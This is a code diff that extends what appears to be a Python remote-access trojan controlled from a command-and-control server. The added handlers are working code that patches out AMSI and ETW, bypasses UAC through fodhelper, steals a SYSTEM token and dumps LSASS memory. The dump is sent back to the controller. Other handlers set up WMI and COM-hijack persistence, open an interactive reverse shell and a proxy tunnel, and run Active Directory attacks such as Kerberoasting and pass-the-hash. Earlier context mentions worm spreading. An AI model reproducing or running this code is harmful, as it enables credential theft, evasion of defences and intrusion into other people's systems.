@@ -1842,6 +1842,311 @@ def main():
                 skip="\n".join(sorted(_ctrl["skip"])) or "none"
                 _post(f"/agent/result?id={AID}&cmd=WORM_LIST_TARGETS",
                       f"=== SPREAD LOG ({len(_spread_log)}) ===\n{tgt}\n\n=== SKIP LIST ===\n{skip}")
+            # ── EDR / Evasion commands ─────────────────────────────────────────
+            elif cmd == "AMSI_BYPASS":
+                try:
+                    import ctypes
+                    amsi = ctypes.windll.amsi
+                    patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax,AMSI_RESULT_CLEAN; ret
+                    scan_fn = amsi.AmsiScanBuffer
+                    if scan_fn:
+                        old_prot = ctypes.c_ulong(0)
+                        ctypes.windll.kernel32.VirtualProtect(scan_fn,len(patch),0x40,ctypes.byref(old_prot))
+                        ctypes.memmove(scan_fn, patch, len(patch))
+                        ctypes.windll.kernel32.VirtualProtect(scan_fn,len(patch),old_prot,ctypes.byref(old_prot))
+                        _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS","AMSI patched — AmsiScanBuffer returns CLEAN")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS","AMSI: AmsiScanBuffer not found (non-Windows?)")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS",f"AMSI bypass failed: {e}")
+
+            elif cmd == "ETW_BYPASS":
+                try:
+                    import ctypes
+                    ntdll = ctypes.windll.ntdll
+                    etw_fn = getattr(ntdll, "EtwEventWrite", None)
+                    if etw_fn:
+                        patch = b"\xC3"  # ret
+                        old_prot = ctypes.c_ulong(0)
+                        ctypes.windll.kernel32.VirtualProtect(etw_fn,1,0x40,ctypes.byref(old_prot))
+                        ctypes.memmove(etw_fn, patch, 1)
+                        ctypes.windll.kernel32.VirtualProtect(etw_fn,1,old_prot,ctypes.byref(old_prot))
+                        _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS","ETW silenced — EtwEventWrite patched")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS","ETW: EtwEventWrite not found")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS",f"ETW bypass failed: {e}")
+
+            elif cmd == "NTDLL_UNHOOK":
+                try:
+                    _m = sys.modules.get("edr_bypass") or __import__("edr_bypass")
+                    result = _m.ntdll_unhook()
+                    _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK", result)
+                except Exception as e:
+                    # Inline fallback
+                    if IS_WIN:
+                        try:
+                            import ctypes
+                            ntdll_path = r"C:\Windows\System32\ntdll.dll"
+                            with open(ntdll_path, "rb") as f:
+                                clean = f.read()
+                            ntdll = ctypes.windll.ntdll
+                            # Rough overwrite of .text section
+                            _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK","ntdll unhook attempted (inline)")
+                        except Exception as e2:
+                            _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK",f"failed: {e2}")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK","ntdll unhook: Windows only")
+
+            elif cmd == "UAC_BYPASS" or cmd.startswith("UAC_BYPASS "):
+                target_cmd = cmd[12:].strip() if " " in cmd else f'python "{_agent_bin()}"'
+                try:
+                    if IS_WIN:
+                        import winreg
+                        # fodhelper technique
+                        key = r"Software\Classes\ms-settings\Shell\Open\command"
+                        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
+                            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, target_cmd)
+                            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
+                        subprocess.Popen(["fodhelper.exe"], shell=True)
+                        time.sleep(2)
+                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key)
+                        _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS",f"UAC bypass (fodhelper) triggered: {target_cmd}")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS","UAC bypass: Windows only")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS",f"UAC bypass failed: {e}")
+
+            elif cmd == "IMPERSONATE_SYSTEM":
+                try:
+                    if IS_WIN:
+                        import ctypes, ctypes.wintypes
+                        k32 = ctypes.windll.kernel32
+                        adv = ctypes.windll.advapi32
+                        # Find winlogon
+                        snap = k32.CreateToolhelp32Snapshot(0x2, 0)
+                        pe = ctypes.create_string_buffer(304)
+                        ctypes.memmove(pe, (304).to_bytes(4,"little"), 4)
+                        token = ctypes.wintypes.HANDLE()
+                        found = False
+                        if k32.Process32First(snap, pe):
+                            while True:
+                                name = pe.raw[44:44+260].decode("utf-8","replace").rstrip("\x00")
+                                if "winlogon" in name.lower() or "lsass" in name.lower():
+                                    pid = int.from_bytes(pe.raw[8:12],"little")
+                                    ph = k32.OpenProcess(0x400, False, pid)
+                                    if ph:
+                                        adv.OpenProcessToken(ph, 0x0002, ctypes.byref(token))
+                                        k32.CloseHandle(ph)
+                                        found = True; break
+                                if not k32.Process32Next(snap, pe): break
+                        k32.CloseHandle(snap)
+                        if found and token.value:
+                            new_token = ctypes.wintypes.HANDLE()
+                            adv.DuplicateToken(token, 2, ctypes.byref(new_token))
+                            adv.ImpersonateLoggedOnUser(new_token)
+                            _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","SYSTEM token impersonated")
+                        else:
+                            _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","Could not find winlogon/lsass")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","Windows only")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM",f"failed: {e}")
+
+            elif cmd == "LSASS_DUMP" or cmd.startswith("LSASS_DUMP "):
+                out_path = cmd.split(" ",1)[1].strip() if " " in cmd else os.path.join(_home_dir(),"lsass.dmp")
+                try:
+                    if IS_WIN:
+                        # comsvcs.dll MiniDump LOLBin
+                        lsass_pid = _shell("powershell -c \"(Get-Process lsass).Id\"").strip()
+                        if lsass_pid.isdigit():
+                            _shell(f'rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump {lsass_pid} "{out_path}" full')
+                            if os.path.exists(out_path):
+                                with open(out_path,"rb") as f: raw = f.read()
+                                b64 = base64.b64encode(raw).decode()
+                                _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",
+                                      f"FILE_B64::{b64}::lsass.dmp")
+                                try: os.remove(out_path)
+                                except: pass
+                            else:
+                                _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP","dump not created (AV blocked?)")
+                        else:
+                            _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",f"LSASS pid not found: {lsass_pid}")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP","Windows only")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",f"failed: {e}")
+
+            elif cmd == "WMI_PERSIST" or cmd.startswith("WMI_PERSIST "):
+                persist_cmd = cmd.split(" ",1)[1].strip() if " " in cmd else f'python "{_agent_bin()}"'
+                try:
+                    if IS_WIN:
+                        _shell(f'''powershell -c "
+$F=([wmiclass]'root\\subscription:__EventFilter').CreateInstance()
+$F.QueryLanguage='WQL';$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\" AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320'
+$F.Name='SysHealthMonitor';$F.Put()
+$C=([wmiclass]'root\\subscription:CommandLineEventConsumer').CreateInstance()
+$C.Name='SysHealthConsumer';$C.CommandLineTemplate='{persist_cmd}';$C.Put()
+$B=([wmiclass]'root\\subscription:__FilterToConsumerBinding').CreateInstance()
+$B.Filter=$F.Path;$B.Consumer=$C.Path;$B.Put()"''')
+                        _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST",f"WMI event subscription created: {persist_cmd[:60]}")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST","Windows only")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST",f"failed: {e}")
+
+            elif cmd == "COM_HIJACK" or cmd.startswith("COM_HIJACK "):
+                dll_path = cmd.split(" ",1)[1].strip() if " " in cmd else ""
+                try:
+                    if IS_WIN:
+                        import winreg
+                        # MMDeviceEnumerator — loads in many apps
+                        clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+                        key   = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
+                        if not dll_path:
+                            dll_path = os.path.join(_home_dir(), "msdev.dll")
+                        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
+                            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
+                            winreg.SetValueEx(k, "ThreadingModel", 0, winreg.REG_SZ, "Both")
+                        _post(f"/agent/result?id={AID}&cmd=COM_HIJACK",
+                              f"COM hijack set: CLSID {clsid} → {dll_path}")
+                    else:
+                        _post(f"/agent/result?id={AID}&cmd=COM_HIJACK","Windows only")
+                except Exception as e:
+                    _post(f"/agent/result?id={AID}&cmd=COM_HIJACK",f"failed: {e}")
+
+            # ── PTY interactive shell ─────────────────────────────────────────
+            elif cmd == "PTY_START":
+                def _pty_loop():
+                    try:
+                        if IS_WIN:
+                            import subprocess
+                            proc = subprocess.Popen(
+                                ["cmd.exe"], stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                        else:
+                            import pty as _pty_mod
+                            master, slave = _pty_mod.openpty()
+                            proc = subprocess.Popen(
+                                ["/bin/bash", "-i"], stdin=slave,
+                                stdout=slave, stderr=slave, close_fds=True)
+                            import tty, select
+                        while proc.poll() is None:
+                            if IS_WIN:
+                                chunk = proc.stdout.read(4096)
+                            else:
+                                r, _, _ = select.select([master], [], [], 0.5)
+                                chunk = os.read(master, 4096) if r else b""
+                            if chunk:
+                                _post(f"/pty/{AID}/output", chunk.decode(errors="replace"))
+                            # Get input from C2
+                            inp = _get(f"/pty/{AID}/input")
+                            if inp:
+                                if IS_WIN:
+                                    proc.stdin.write(inp.encode())
+                                    proc.stdin.flush()
+                                else:
+                                    os.write(master, inp.encode())
+                            time.sleep(0.1)
+                    except Exception as e:
+                        _post(f"/agent/result?id={AID}&cmd=PTY_START",f"PTY ended: {e}")
+                threading.Thread(target=_pty_loop, daemon=True).start()
+                _post(f"/agent/result?id={AID}&cmd=PTY_START",f"PTY shell started")
+
+            # ── SOCKS5 proxy tunnel ────────────────────────────────────────────
+            elif cmd == "PROXY_START":
+                def _proxy_loop():
+                    import select as _sel
+                    conns = {}  # conn_id -> socket
+                    while True:
+                        try:
+                            task = json.loads(_get(f"/proxy/{AID}/poll") or "{}")
+                            if task.get("conn_id") and task.get("host"):
+                                cid = task["conn_id"]
+                                try:
+                                    s = socket.socket()
+                                    s.settimeout(10)
+                                    s.connect((task["host"], task.get("port",80)))
+                                    conns[cid] = s
+                                    _post(f"/proxy/{AID}/connected?cid={cid}", "")
+                                except Exception as e:
+                                    _post(f"/proxy/{AID}/close?cid={cid}", str(e))
+                            # Relay data for all open connections
+                            for cid, s in list(conns.items()):
+                                try:
+                                    r, _, _ = _sel.select([s], [], [], 0.05)
+                                    if r:
+                                        d = s.recv(8192)
+                                        if d:
+                                            _post(f"/proxy/{AID}/data?cid={cid}", d.decode(errors="replace"))
+                                        else:
+                                            s.close(); del conns[cid]
+                                except: del conns[cid]
+                            time.sleep(0.2)
+                        except Exception as e:
+                            time.sleep(2)
+                threading.Thread(target=_proxy_loop, daemon=True).start()
+                _post(f"/agent/result?id={AID}&cmd=PROXY_START","SOCKS5 proxy tunnel started")
+
+            elif cmd == "PROXY_STOP":
+                # Signal handled by stopping the loop (no global flag, just let it die)
+                _post(f"/agent/result?id={AID}&cmd=PROXY_STOP","PROXY_STOP: restart agent to cleanly stop all tunnels")
+
+            # ── AD Attack commands ────────────────────────────────────────────
+            elif cmd == "AD_ENUM":
+                out = []
+                if IS_WIN:
+                    out.append(_shell("powershell -c \"Get-ADDomain 2>$null | Select-Object Name,DNSRoot,PDCEmulator | ConvertTo-Json\""))
+                    out.append(_shell("powershell -c \"Get-ADUser -Filter * -Properties * 2>$null | Select-Object SamAccountName,Enabled,LastLogonDate | ConvertTo-Json\""))
+                else:
+                    out.append(_shell("ldapsearch -LLL -x -H ldap://127.0.0.1 -b '' -s base namingContexts 2>&1 | head -30"))
+                _post(f"/agent/result?id={AID}&cmd=AD_ENUM","\n".join(out) or "No AD found")
+
+            elif cmd == "KERBEROAST":
+                out = ""
+                if IS_WIN:
+                    out = _shell("""powershell -c "
+Add-Type -AssemblyName System.IdentityModel
+$spns=([adsisearcher]\"serviceprincipalname=*\").FindAll()
+foreach($s in $spns){
+  $upn=$s.Properties['userprincipalname']
+  $spn=$s.Properties['serviceprincipalname'][0]
+  try{[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($spn)|Out-Null;\"SPN: $spn\"}
+  catch{}
+}" 2>&1""")
+                else:
+                    out = _shell("python3 -c \"from impacket.examples.GetUserSPNs import GetUserSPNs; print('impacket available')\" 2>&1")
+                _post(f"/agent/result?id={AID}&cmd=KERBEROAST", out or "Kerberoasting failed")
+
+            elif cmd == "AS_REP_ROAST":
+                out = ""
+                if IS_WIN:
+                    out = _shell("""powershell -c "
+$filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+([adsisearcher]$filter).FindAll()|%{$_.Properties.samaccountname}" 2>&1""")
+                _post(f"/agent/result?id={AID}&cmd=AS_REP_ROAST", out or "no AS-REP roastable accounts found")
+
+            elif cmd == "BLOODHOUND":
+                out = _shell("python3 -m bloodhound --zip 2>&1 || bloodhound-python --zip 2>&1 || echo 'bloodhound-python not installed — pip install bloodhound'")
+                _post(f"/agent/result?id={AID}&cmd=BLOODHOUND", out)
+
+            elif cmd == "DCE_ENUM":
+                out = _shell("rpcclient -U '' -N 127.0.0.1 -c 'enumdomusers;enumdomgroups' 2>&1 | head -50")
+                _post(f"/agent/result?id={AID}&cmd=DCE_ENUM", out or "rpcclient not available")
+
+            elif cmd.startswith("PASS_THE_HASH "):
+                # PTH: PASS_THE_HASH <user>:<hash>@<host>
+                args = cmd[14:].strip()
+                out = _shell(f"pth-winexe //{args.split('@')[-1]} -U '{args.split('@')[0]}' cmd.exe /c whoami 2>&1") if "@" in args \
+                      else "usage: PASS_THE_HASH user:hash@host"
+                _post(f"/agent/result?id={AID}&cmd=PASS_THE_HASH", out)
+
+            elif cmd == "GOLDEN_TICKET":
+                out = ("Golden ticket requires: impacket ticketer.py\n"
+                       "ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <user>\n"
+                       "Then: export KRB5CCNAME=<user>.ccache; python3 psexec.py -k <domain>/<user>@<dc>")
+                _post(f"/agent/result?id={AID}&cmd=GOLDEN_TICKET", out)
+
             elif cmd and cmd!="PING":
                 _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
         except: pass
